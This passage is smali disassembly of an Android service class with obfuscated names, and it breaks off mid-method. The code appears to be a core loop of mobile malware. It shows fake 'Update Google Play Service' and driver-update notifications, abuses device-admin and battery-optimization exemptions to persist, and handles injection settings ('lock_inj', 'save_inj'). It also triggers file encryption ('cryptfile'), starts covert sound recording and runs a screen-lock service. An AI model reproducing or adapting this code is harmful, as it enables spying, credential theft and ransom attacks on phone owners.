.class public Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/c;

.field b:Lwocwvy/czyxoxmbauu/slsa/b;

.field c:Lwocwvy/czyxoxmbauu/slsa/a;

.field d:Ljava/lang/String;

.field e:Landroid/content/Context;

.field private f:Landroid/app/Notification;

.field private final g:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, ""

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/a;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/a;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    const-string v0, "jtfxlnc"

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->g:Ljava/lang/String;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->d:Ljava/lang/String;

    return-void
.end method

.method private a()V
    .locals 2
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    new-instance v0, Landroid/app/Notification$Builder;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    invoke-direct {v0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Info"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "Update The Driver System.."

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->f:Landroid/app/Notification;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->f:Landroid/app/Notification;

    const/16 v1, 0x26b2

    invoke-virtual {p0, v1, v0}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method

.method private b()V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc$1;

    invoke-direct {v1, p0}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc$1;-><init>(Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 17

    move-object/from16 v1, p0

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a()Z

    move-result v2

    if-eqz v2, :cond_0

    return-void

    :cond_0
    iput-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "STARTWHILE"

    const-string v4, "!!!"

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x1

    :try_start_0
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v4, "power"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->d:Ljava/lang/String;

    invoke-virtual {v3, v2, v4}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v3

    if-eqz v3, :cond_1

    invoke-virtual {v3}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    :try_start_1
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "swspacket"

    invoke-virtual {v4, v1, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "jtfxlnc"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "App Packet "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :try_start_2
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "jtfxlnc"

    const-string v7, "swspacket"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    if-nez v4, :cond_2

    :catch_1
    const/4 v4, 0x0

    goto :goto_0

    :catch_2
    :cond_2
    const/4 v4, 0x1

    :goto_0
    if-nez v4, :cond_3

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;)V

    :cond_3
    const/4 v4, -0x1

    :try_start_3
    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v8, "interval"

    invoke-virtual {v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_1

    :catch_3
    const/16 v6, 0xf

    :goto_1
    :try_start_4
    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "time_work"

    invoke-virtual {v8, v1, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    move v12, v6

    const/16 v4, 0x3e8

    const/4 v6, 0x0

    goto :goto_2

    :catch_4
    move v12, v6

    const/16 v4, 0x3e8

    const/4 v6, 0x0

    const/4 v8, 0x0

    :goto_2
    const/4 v9, -0x1

    const/4 v10, 0x0

    const/4 v11, 0x0

    :goto_3
    :try_start_5
    sget-object v13, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    int-to-long v14, v4

    invoke-virtual {v13, v14, v15}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_5

    goto :goto_4

    :catch_5
    move-exception v0

    move-object v4, v0

    invoke-virtual {v4}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_4
    const-string v4, "device_policy"

    invoke-virtual {v1, v4}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/admin/DevicePolicyManager;

    new-instance v13, Landroid/content/ComponentName;

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v15, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/a;

    invoke-direct {v13, v14, v15}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :try_start_6
    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v15, "startAlarm"

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v3, "Interval"

    invoke-virtual {v7, v5, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    int-to-long v2, v3

    invoke-static {v14, v15, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6

    :catch_6
    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v2, "keyguard"

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/KeyguardManager;

    invoke-virtual {v2}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v2

    const/16 v3, 0x1a

    if-eqz v2, :cond_5

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "foregroundwhile"

    invoke-virtual {v5, v1, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v7, "true"

    invoke-virtual {v5, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_6

    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v5, v3, :cond_4

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "Google"

    const-string v7, "Update Google Play Service"

    invoke-static {v1, v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/app/Service;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_5

    :cond_4
    invoke-direct/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a()V

    goto :goto_5

    :cond_5
    const/4 v5, 0x1

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->stopForeground(Z)V

    :cond_6
    :goto_5
    const/high16 v5, 0x40000000    # 2.0f

    const/high16 v7, 0x10000000

    :try_start_7
    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v15, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v3, "urls"

    invoke-virtual {v14, v15, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v14, 0x1

    if-gt v3, v14, :cond_8

    invoke-virtual {v4, v13}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v3

    if-eqz v3, :cond_7

    new-instance v3, Landroid/content/Intent;

    const-class v4, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/b;

    invoke-direct {v3, v1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "str"

    const-string v13, "stop"

    invoke-virtual {v3, v4, v13}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v3, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x20000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v3}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startActivity(Landroid/content/Intent;)V

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "lock_inj"

    const-string v13, ""

    invoke-virtual {v3, v1, v4, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "save_inj"

    const-string v13, ""

    invoke-virtual {v3, v1, v4, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_7

    :cond_7
    const/16 v4, 0x1388

    new-instance v3, Landroid/content/Intent;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/ncec/dzudmx;

    invoke-direct {v3, v1, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v13, "start"

    const-string v14, "deleteApp"

    invoke-virtual {v3, v13, v14}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v3, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v3}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startActivity(Landroid/content/Intent;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_7

    :goto_6
    const/4 v2, 0x1

    goto/16 :goto_3

    :catch_7
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "jtfxlnc"

    const-string v13, "STARTWHEIL -> stopSelf() error"

    invoke-virtual {v3, v4, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_8
    :goto_7
    add-int/lit8 v6, v6, 0x2

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v3, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_9

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v3, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_a

    :cond_9
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;

    invoke-virtual {v3, v4, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v3

    if-nez v3, :cond_a

    :try_start_8
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v14, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;

    invoke-direct {v4, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_8

    :catch_8
    :cond_a
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v3, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_b

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v13, "save_inj"

    invoke-virtual {v3, v4, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x5

    if-lt v3, v4, :cond_b

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;

    invoke-virtual {v3, v4, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v3

    if-nez v3, :cond_b

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v4, Landroid/content/Intent;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v14, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;

    invoke-direct {v4, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_b
    const/16 v3, 0x7d0

    const/high16 v4, 0x800000

    if-nez v2, :cond_c

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v14, "cryptfile"

    invoke-virtual {v13, v1, v14}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "true"

    invoke-virtual {v13, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_c

    new-instance v3, Landroid/content/Intent;

    const-class v13, Lwocwvy/czyxoxmbauu/slsa/ncec/kcdbt;

    invoke-direct {v3, v1, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v3}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startActivity(Landroid/content/Intent;)V

    const/16 v3, 0x1f4

    :cond_c
    :try_start_9
    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v14, "startRecordSound"

    invoke-virtual {v13, v1, v14}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "stop"

    invoke-virtual {v13, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_d

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v14, "recordsoundseconds"

    invoke-virtual {v13, v1, v14}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v13

    if-lez v13, :cond_d

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    new-instance v15, Landroid/content/Intent;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v5, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    invoke-direct {v15, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "time"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, ""

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v15, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v4

    invoke-virtual {v14, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_9

    goto :goto_8

    :catch_9
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "jtfxlnc"

    const-string v7, "Error Recod Sound"

    invoke-virtual {v4, v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_d
    :goto_8
    if-nez v2, :cond_e

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v7, Lwocwvy/czyxoxmbauu/slsa/ttiegryczsx;

    invoke-virtual {v4, v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_e

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "lookscreen"

    invoke-virtual {v4, v1, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "true"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_e

    new-instance v4, Landroid/content/Intent;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v7, Lwocwvy/czyxoxmbauu/slsa/ttiegryczsx;

    invoke-direct {v4, v5, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v4}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_e
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x1a

    if-lt v4, v5, :cond_f

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v5, "power"

    invoke-virtual {v4, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/os/PowerManager;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_10

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v7, Lwocwvy/czyxoxmbauu/slsa/blyvffs;

    invoke-virtual {v4, v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_10

    :try_start_a
    new-instance v4, Landroid/content/Intent;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v7, Lwocwvy/czyxoxmbauu/slsa/blyvffs;

    invoke-direct {v4, v5, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :goto_9
    invoke-virtual {v1, v4}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_a

    goto :goto_a

    :cond_f
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v7, Lwocwvy/czyxoxmbauu/slsa/blyvffs;

    invoke-virtual {v4, v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-nez v4, :cond_10

    :try_start_b
    new-instance v4, Landroid/content/Intent;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-class v7, Lwocwvy/czyxoxmbauu/slsa/blyvffs;

    invoke-direct {v4, v5, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_a

    goto :goto_9

    :catch_a
    :cond_10
    :goto_a
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x14

    const/16 v7, 0xc

    if-lt v4, v5, :cond_16

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    iget v4, v4, Lwocwvy/czyxoxmbauu/slsa/c;->r:I

    if-lt v8, v4, :cond_12

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->a:Lwocwvy/czyxoxmbauu/slsa/c;

